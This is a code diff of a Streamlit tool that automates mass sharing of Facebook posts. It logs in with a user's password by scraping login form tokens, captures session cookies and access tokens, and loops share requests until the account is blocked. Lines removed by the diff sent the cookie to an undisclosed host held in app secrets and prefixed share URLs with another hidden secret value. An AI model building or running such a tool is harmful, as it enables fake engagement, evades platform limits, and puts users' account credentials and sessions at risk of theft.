@@ -1,14 +1,13 @@
 import streamlit as st
-import asyncio
 import aiohttp
+import asyncio
 import re
 import time
 import requests
 import json
 
-st.info("use your dummy account :)")
+st.info("Use your dummy account :)")
 
-# Function to execute sharing logic
 def Execute(cookie, post, share_count, delay):
     head = {
         'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
@@ -48,10 +47,11 @@ def Execute(cookie, post, share_count, delay):
                 "accept-encoding": "gzip, deflate",
                 "host": "b-graph.facebook.com"
             }
+
             count = 0
             while count < share_count + 1:
                 time.sleep(delay)
-                async with session.post(f'{st.secrets.xnxx}{post}&published=0&access_token={token}', headers=ji) as response:
+                async with session.post(f'{post}&published=0&access_token={token}', headers=ji) as response:
                     data = await response.json()
                     if 'id' in data:
                         count += 1
@@ -59,6 +59,7 @@ def Execute(cookie, post, share_count, delay):
                     else:
                         st.write(f":red-background[Blocked] :red[cookie blocked]\nTotal success :green-background[{count}]")
                         return
+
     async def main(num_tasks): 
         async with aiohttp.ClientSession() as session:
             share = Share()
@@ -68,16 +69,10 @@ def Execute(cookie, post, share_count, delay):
                 task = asyncio.create_task(share.share(session, token, cookie))
                 tasks.append(task)
             await asyncio.gather(*tasks)
+
     asyncio.run(main(1))
 
-# Function to check cookie validity
-def cCheck(cookie):
-    res = requests.get(f"{st.secrets.aso}{cookie}").json()
-    if res['status'] == 'Cookie Live': 
-        return True
-    return False
 
-# Function to handle login and fetch the cookie
 def conver_to_puke(user, passw):
     try:
         session = requests.Session()
@@ -92,6 +87,7 @@ def conver_to_puke(user, passw):
             'referer': f'https://free.facebook.com/login/?email={user}',
             'sec-ch-prefers-color-scheme': 'dark',
             'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+            'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.1"',
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-platform': '"Android"',
             'sec-fetch-dest': 'document',
@@ -102,7 +98,8 @@ def conver_to_puke(user, passw):
             'user-agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
             'viewport-width': '980',
         }
-        getlog = session.get('https://free.facebook.com/login.php')
+
+        getlog = session.get(f'https://free.facebook.com/login.php')
         idpass = {
             "lsd": re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),
             "jazoest": re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),
@@ -115,9 +112,10 @@ def conver_to_puke(user, passw):
             "login": "Log In",
             "bi_xrwh": re.search('name="bi_xrwh" value="(.*?)"', str(getlog.text)).group(1),
         }
+
         comp = session.post("https://free.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated", headers=headers, data=idpass, allow_redirects=False)
         jopl = session.cookies.get_dict().keys()
-        cookie = ";".join([f'{key}={value}' for key, value in session.cookies.get_dict().items()])
+        cookie = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
         if "c_user" in jopl:
             return {"a": True, "b": cookie}
         elif "checkpoint" in jopl:
@@ -126,6 +124,7 @@ def conver_to_puke(user, passw):
             return {"a": False, "b": ":red-background[error] Invalid username or password"}
     except Exception as ed:
         return {"a": False, "b": f'{ed}'}
+
 
 #----------------------------#
 COOKIEm, APPSTATEm, LOGINm = st.tabs(["Cookie", "Appstate", "Login"])
